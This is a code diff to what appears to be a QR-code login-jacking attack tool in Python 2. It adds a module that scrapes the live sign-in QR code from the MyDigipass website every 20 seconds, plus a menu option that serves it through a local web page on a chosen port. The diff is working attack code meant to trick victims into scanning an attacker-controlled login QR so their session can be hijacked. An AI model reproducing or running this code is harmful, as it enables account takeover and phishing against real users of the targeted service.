@@ -277,6 +277,29 @@ def Taobao():
 		except:
 			break
 
+def mydigipass():
+	driver = create_driver()
+	time.sleep(5)
+	print " [+]Navigating To Website.."
+	driver.get("https://www.mydigipass.com/en/fp/signin/smartphone/qr")
+	time.sleep(5)
+	while True:
+		print "-- --- -- --- -- --- -- --- -- --- --"
+		try:
+			imgs = driver.find_elements_by_tag_name('img')
+			img = imgs[1]
+			print " [+]The QR code image found !"
+			src = img.get_attribute('src')
+			print " [+]Downloading the image.."
+			qr = urllib.urlretrieve(src, "tmp.png")
+			print " [#]Saved To tmp.png"
+			time.sleep(20)
+			print " [!]Refreshing page..."
+			driver.refresh()
+			continue
+		except:
+			break
+
 def make(typ="html"):
 	if typ == "html":
 		code = """<html>
@@ -568,6 +591,21 @@ def main():
 """
 		choice_2 = raw_input(" Second Choice > ")
 		if choice_2 == "00":
+			main()
+
+		elif int(choice_2) == 1:
+			port = raw_input(" Port to listen on (Default 1337) : ")
+			try:
+				int(port)
+			except ValueError:
+				port = 1337
+
+			if port == "":
+				port = 1337
+			clear()
+			make()
+			Serve_it(port)
+			mydigipass()
 			main()
 
 	#Customization
